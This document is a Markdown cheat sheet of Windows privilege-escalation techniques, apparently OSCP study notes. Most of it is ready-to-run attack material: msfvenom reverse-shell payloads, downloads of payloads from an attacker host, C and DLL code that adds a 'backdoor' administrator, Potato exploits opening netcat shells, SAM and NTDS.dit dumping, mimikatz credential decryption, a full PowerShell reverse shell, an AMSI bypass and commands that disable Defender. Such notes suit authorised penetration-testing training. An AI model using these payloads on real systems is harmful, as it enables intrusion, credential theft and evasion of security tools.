# Privilege Escalation Windows

## Table of Contents

- [Enumeration](#enumeration)
  - [System Information](#system-information)
  - [User & Privilege Checks](#user--privilege-checks)
- [Service Exploitation](#service-exploitation)
  - [Unquoted Service Path](#unquoted-service-path)
  - [Weak Service Permissions](#weak-service-permissions)
  - [Service Binary Hijacking](#service-binary-hijacking)
- [Potato Exploits](#potato-exploits)
  - [SigmaPotato](#sigmapotato)
  - [GodPotato](#godpotato)
  - [PrintSpoofer](#printspoofer)
  - [SharpEfsPotato](#sharpefspotato)
  - [JuicyPotato](#juicypotato)
  - [JuicyPotatoNG](#juicypotatong)
  - [SweetPotato](#sweetpotato)
- [SeBackupPrivilege Abuse](#sebackupprivilege-abuse)
  - [Check Privilege](#check-privilege)
  - [Dump SAM & SYSTEM](#dump-sam--system)
  - [Dump NTDS.dit (Domain Controller)](#dump-ntdsdit-domain-controller)
  - [Robocopy Alternative](#robocopy-alternative)
- [Registry Credentials](#registry-credentials)
  - [Auto Logon Credentials](#auto-logon-credentials)
  - [Saved Credentials](#saved-credentials)
  - [PuTTY Saved Sessions](#putty-saved-sessions)
  - [VNC Passwords](#vnc-passwords)
- [Credential Hunting](#credential-hunting)
  - [Search Files for Passwords](#search-files-for-passwords)
  - [Common Credential Locations](#common-credential-locations)
  - [PowerShell History](#powershell-history)
  - [Wireless Passwords](#wireless-passwords)
  - [DPAPI Protected Credentials](#dpapi-protected-credentials)
- [Enumeration Tools](#enumeration-tools)
  - [PowerUp](#powerup)
  - [PrivescCheck](#privesccheck)
  - [winPEAS](#winpeas)
  - [Seatbelt](#seatbelt)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Scheduled Tasks](#scheduled-tasks)
  - [Enumerate Scheduled Tasks](#enumerate-scheduled-tasks)
  - [Find Writable Scheduled Task Scripts](#find-writable-scheduled-task-scripts)
  - [Exploitation](#exploitation)
- [DLL Hijacking](#dll-hijacking)
  - [Detection with Procmon](#detection-with-procmon)
  - [PowerShell Service Enumeration](#powershell-service-enumeration)
  - [Find Writable Directories in PATH](#find-writable-directories-in-path)
  - [Find Writable Service Directories](#find-writable-service-directories)
  - [Create Malicious DLL](#create-malicious-dll)
  - [Compile DLL](#compile-dll)
  - [Exploitation Steps](#exploitation-steps)
- [AV Evasion](#av-evasion)
  - [ThreatChecker](#threatchecker)
  - [DefenderCheck](#defendercheck)
  - [Obfuscation Techniques](#obfuscation-techniques)
- [See Also](#see-also)

---

## Enumeration

### System Information

```cmd
systeminfo
hostname
whoami
net users
net localgroup administrators
```

### User & Privilege Checks

#### Integrity Levels

| Level | Description |
| :--- | :--- |
| System | System (Kernel) |
| High | Elevated Users |
| Medium | Standard Users |
| Low | Restricted Rights Often Used in Sandbox Processes |
| Untrusted | Extremely Limited Access Rights in High-Risk Processes |

#### Check Current Privileges

```cmd
whoami /priv
whoami /groups
whoami /all
```

#### Key Privileges for Escalation

| Privilege | Exploitation |
| :--- | :--- |
| SeImpersonatePrivilege | Potato Exploits (SigmaPotato, GodPotato) |
| SeAssignPrimaryTokenPrivilege | Potato Exploits |
| SeBackupPrivilege | Dump SAM/SYSTEM, copy protected files |
| SeRestorePrivilege | Overwrite protected files |
| SeTakeOwnershipPrivilege | Take ownership of any file |
| SeDebugPrivilege | Inject into processes |

---

## Service Exploitation

### Unquoted Service Path

#### Find Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```

> ถ้า service path มี space และไม่มี quotes

```shell
# Attacker

msfvenom -p windows/x64/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o Service.exe 

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit -j'

python -m http.server 80

# Victim

sc qc vulnerable_service 

C:\Program Files\Vuln\Service.exe

certutil -urlcache -split -f "http://192.168.45.187/reverse.exe" "C:\Program Files\Vuln\Service.exe"

sc stop vulnerable_service

sc start vulnerable_service
```

---

### Weak Service Permissions

```cmd
# Attacker

msfvenom -p windows/x64/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o reverse.exe 

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit -j'

python -m http.server 80

# Victim

accesschk.exe /accepteula -uwcqv "Everyone" "service_name"

certutil -urlcache -split -f "http://192.168.45.187/reverse.exe" "C:\reverse.exe"

sc config service_name binpath= "C:\reverse.exe"

sc start service_name
```

---

### Service Binary Hijacking

#### Example: xampp (mysql)

```c
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user ar3mus password123! /add");
i = system ("net localgroup administrators ar3mus /add");
return 0;
}
```

```shell
# Attacker
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python -m http.server 80

# Victim

powershell -ep bypass

iwr -uri http://192.168.45.183/adduser.exe -Outfile adduser.exe

icacls "C:\xampp\mysql\bin\mysqld.exe"

move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak

move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

whoami /priv

shutdown /r /t 0

runas ar3mus
```

---

## Potato Exploits

> Used when SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled

| Tool | Windows Version | Notes |
|------|-----------------|-------|
| SigmaPotato | Modern Windows | Recommended for OSCP |
| GodPotato | All versions | Universal |
| PrintSpoofer | Server 2016/2019, Win 10 | Print Spooler |
| SharpEfsPotato | All versions | EFS service |
| JuicyPotato | < Server 2019 | Deprecated on new OS |
| JuicyPotatoNG | All versions | Updated version |
| SweetPotato | All versions | Multi-technique |

### SigmaPotato

> https://github.com/tylerdotrar/SigmaPotato

Works on modern Windows versions. Recommended for OSCP.

```cmd
# Download
iwr -Uri http://$lhost/SigmaPotato.exe -Outfile SigmaPotato.exe

# Add user to local admins
.\SigmaPotato.exe "net user backdoor Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators backdoor /add"

# Reverse shell
.\SigmaPotato.exe --revshell $lhost $lport

# Execute custom command
.\SigmaPotato.exe "cmd /c whoami"
.\SigmaPotato.exe "C:\Windows\Temp\nc.exe -e cmd $lhost $lport"
```

#### Quick Exploitation Flow

```shell
# On Kali
python -m http.server 80
nc -lvnp 5555

# On Target (PowerShell)
iwr -Uri http://$lhost/SigmaPotato.exe -Outfile SigmaPotato.exe
.\SigmaPotato.exe --revshell $lhost 5555
```

### GodPotato

> https://github.com/BeichenDream/GodPotato

```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe $lhost $lport"
```

### PrintSpoofer

> https://github.com/itm4n/PrintSpoofer

```cmd
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe $lhost $lport -e cmd"
```

### SharpEfsPotato

> https://github.com/bugch3ck/SharpEfsPotato

```cmd
.\SharpEfsPotato.exe -p C:\Windows\Temp\reverse.exe
```

### JuicyPotato

> https://github.com/ohpe/juicy-potato

```cmd
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\reverse.exe -t *
```

### JuicyPotatoNG

> https://github.com/antonioCoco/JuicyPotatoNG

```cmd
.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\reverse.exe"
```

### SweetPotato

> https://github.com/CCob/SweetPotato

```cmd
.\SweetPotato.exe -p C:\Windows\Temp\reverse.exe
```

---

## SeBackupPrivilege Abuse

> Used to dump SAM/SYSTEM registry hives or copy protected files

### Check Privilege

```cmd
whoami /priv | findstr SeBackupPrivilege
```

### Dump SAM & SYSTEM

```cmd
# Create backup of registry hives
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM

# Transfer to attacker machine (via Evil-WinRM)
download SAM
download SYSTEM

# On Kali - Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Dump NTDS.dit (Domain Controller)

```powershell
# Enable SeBackupPrivilege in current session
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

# Create shadow copy
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending)[0].DeviceObject

# Copy NTDS.dit from shadow
Copy-FileSeBackupPrivilege "$shadowPath\Windows\NTDS\ntds.dit" C:\Users\Public\ntds.dit

# Copy SYSTEM hive
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
```

### Robocopy Alternative

```cmd
# Robocopy with backup mode to copy protected files
robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit
```

---

## Registry Credentials

### Auto Logon Credentials

> Windows may store auto-logon credentials in registry

```cmd
# Check for stored auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName

# One-liner to get all
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

```powershell
# PowerShell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | 
  Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

### Saved Credentials

```cmd
# List saved credentials
cmdkey /list

# If credentials are saved, use runas
runas /savecred /user:Administrator cmd.exe
```

### PuTTY Saved Sessions

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### VNC Passwords

```cmd
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
```

---

## Credential Hunting

### Search Files for Passwords

```cmd
# Search common file types
findstr /si password *.txt *.ini *.xml *.config *.cfg
findstr /spin "password" *.*

# Search entire drive
dir /s /b *pass*.txt *cred*.txt *vnc*.ini *.config
```

```powershell
# PowerShell recursive search
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
```

### Common Credential Locations

```cmd
# Unattend files (installation passwords)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\Panther\UnattendGC\Unattend.xml 2>nul

# Web config files
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul

# McAfee files
type C:\ProgramData\McAfee\Common Framework\SiteList.xml 2>nul

# VNC
type C:\Users\*\.vnc\passwd 2>nul
type C:\Program Files\UltraVNC\ultravnc.ini 2>nul
```

### PowerShell History

```powershell
# Current user history
type (Get-PSReadLineOption).HistorySavePath

# All users history
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | 
  ForEach-Object { Write-Output "=== $_ ==="; Get-Content $_ }
```

### Wireless Passwords

```cmd
# List saved WiFi profiles
netsh wlan show profiles

# Get password for specific profile
netsh wlan show profile name="ProfileName" key=clear
```

### DPAPI Protected Credentials

```cmd
# List DPAPI credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul

# Use mimikatz to decrypt
mimikatz.exe
sekurlsa::dpapi
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\GUID
```

---

## Enumeration Tools

### PowerUp

> https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

### PrivescCheck

> https://github.com/itm4n/PrivescCheck

```powershell
powershell -ep bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

### winPEAS

> https://github.com/carlospolop/PEASS-ng

```cmd
.\winPEASx64.exe
```

### Seatbelt

> https://github.com/GhostPack/Seatbelt

```cmd
.\Seatbelt.exe -group=all
```

---

## AlwaysInstallElevated

> Registry keys must be set to 1

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Exploit

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f msi -o malicious.msi
```

```cmd
msiexec /quiet /qn /i malicious.msi
```

---

## Scheduled Tasks

### Enumerate Scheduled Tasks

```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v

# Filter by task name
schtasks /query /fo LIST | findstr "TaskName"

# Query specific task
schtasks /query /tn "\Microsoft\TaskName" /v /fo list
```

#### PowerShell Enumeration

```powershell
# List non-Microsoft tasks (custom tasks)
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }

# Get task details with actions
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | 
  ForEach-Object { 
    $task = $_
    $actions = $task | Get-ScheduledTaskInfo
    [PSCustomObject]@{
      TaskName = $task.TaskName
      TaskPath = $task.TaskPath
      State = $task.State
      UserId = $task.Principal.UserId
    }
  } | Format-Table -AutoSize

# Get task action (executable path)
(Get-ScheduledTask -TaskName "TaskName").Actions
```

### Find Writable Scheduled Task Scripts

```cmd
# Check permissions on task script
icacls "C:\Path\To\Script.bat"
icacls "C:\Path\To\Script.ps1"
```

### Exploitation

```powershell
# If script is writable, replace with reverse shell
# Edit the script file
notepad C:\Path\To\Script.ps1

# Add PowerShell reverse shell
$LHOST = "$lhost"
$LPORT = 4444
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024
while ($TCPClient.Connected) {
  while ($NetworkStream.DataAvailable) {
    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
  }
  if ($TCPClient.Connected -and $Code.Length -gt 1) {
    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
    $StreamWriter.Write("$Output`n")
    $Code = $null
  }
}
$TCPClient.Close()
```

```shell
# On Kali - wait for task to execute
nc -lvnp 4444
```

---

## DLL Hijacking

### Detection with Procmon

```cmd
# Find missing DLLs
procmon.exe    # Filter: Result = NAME NOT FOUND, Path ends with .dll
```

### PowerShell Service Enumeration

```powershell
# List services with paths (exclude svchost)
Get-CimInstance -ClassName Win32_Service | 
  Where-Object { $_.PathName -and ($_.PathName -notmatch 'svchost.exe') } | 
  Select-Object Name, DisplayName, StartName, PathName | 
  Format-Table -AutoSize

# Find services running as SYSTEM
Get-WmiObject -Class Win32_Service | 
  Where-Object { 
    $_.StartName -match "LocalSystem|NT AUTHORITY\\SYSTEM" -and 
    $_.PathName -and 
    ($_.PathName -notmatch 'svchost\.exe') 
  } | 
  Select-Object Name, DisplayName, PathName | 
  Format-Table -AutoSize
```

### Find Writable Directories in PATH

```powershell
# Check writable folders in PATH (DLL search order abuse)
$env:Path.Split(';') | ForEach-Object {
  $p = $_.Trim()
  if ($p -and (Test-Path $p)) {
    $acl = (icacls $p) -join "`n"
    if ($acl -match 'Users.*M' -or $acl -match 'Everyone.*M') {
      [PSCustomObject]@{ Path = $p; ACL = $acl }
    }
  }
} | Format-Table -AutoSize
```

### Find Writable Service Directories

```powershell
# Find service folders writable by Users
Get-WmiObject -Class Win32_Service | ForEach-Object {
  $svc = $_
  if (-not $svc.PathName) { return }
  $exe = ($svc.PathName -replace '"','').Split(' ')[0]
  if (-not $exe) { return }
  $folder = Split-Path $exe -ErrorAction SilentlyContinue
  if (-not $folder -or -not (Test-Path $folder)) { return }
  if ($folder -match [regex]::Escape($env:windir) -and $folder -match 'System32') { return }
  try { $aclText = icacls $folder 2>$null } catch { $aclText = $null }
  if ($aclText -and ($aclText -match 'Users.*M' -or $aclText -match 'Everyone.*M')) {
    [PSCustomObject]@{
      Service = $svc.Name
      ExePath = $exe
      Folder = $folder
    }
  }
} | Format-Table -AutoSize
```

### Create Malicious DLL

```c
// malicious.c - Add user to administrators
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user backdoor Password123! /add");
        system("net localgroup administrators backdoor /add");
    }
    return TRUE;
}
```

#### Create DLL with Reverse Shell

```c
// revshell.c - Execute reverse shell
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("powershell -e <BASE64_ENCODED_PAYLOAD>");
    }
    return TRUE;
}
```

### Compile DLL

```shell
# Install MinGW on Kali
sudo apt install mingw-w64

# Compile x64 DLL
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c -O2 -s

# Compile x86 DLL
i686-w64-mingw32-gcc -shared -o malicious.dll malicious.c -O2 -s

# Verify DLL
file malicious.dll  # Should show PE32+ (DLL) x86-64
```

### Exploitation Steps

```shell
# 1. Transfer DLL to target
python -m http.server 80

# 2. On target - download and place DLL
certutil -urlcache -split -f "http://$lhost/malicious.dll" "C:\VulnerableApp\missing.dll"

# 3. Restart service or wait for application to load DLL
sc stop VulnerableService
sc start VulnerableService

# 4. Connect with new admin user
impacket-psexec backdoor:Password123!@$rhost
```

---

## AV Evasion

> Techniques to bypass Windows Defender and AV detection

### ThreatChecker

> Identifies which bytes in a file trigger AV detection

```shell
# Download from GitHub
# https://github.com/rasta-mouse/ThreatCheck

# Check file for AV signatures
ThreatChecker.exe -f payload.exe

# Check with specific engine
ThreatChecker.exe -f payload.exe -e AMSI
ThreatChecker.exe -f payload.exe -e Defender

# Example output shows byte offset of detection
# Use this to modify specific parts of payload
```

### DefenderCheck

```shell
# Similar tool for Defender
DefenderCheck.exe payload.exe
```

### Obfuscation Techniques

#### AMSI Bypass

```powershell
# PowerShell AMSI Bypass (Matt Graeber)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# One-liner (encoded)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

#### Disable Defender (Requires Admin)

```cmd
:: Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

:: Add exclusion path
Set-MpPreference -ExclusionPath "C:\Temp"

:: Add exclusion for process
Set-MpPreference -ExclusionProcess "mimikatz.exe"
```

#### Payload Modification

```shell
# Shikata Ga Nai encoding (multiple iterations)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Change entry point
# Modify metadata
# Add benign code sections
```

---

## See Also

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - AD-specific privilege escalation paths
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - mimikatz, LaZagne, credential extraction
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Move after escalation
- **[OSCP Exam Guide - Windows PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md#phase-3-privilege-escalation---windows-15-นาที)** - Quick reference
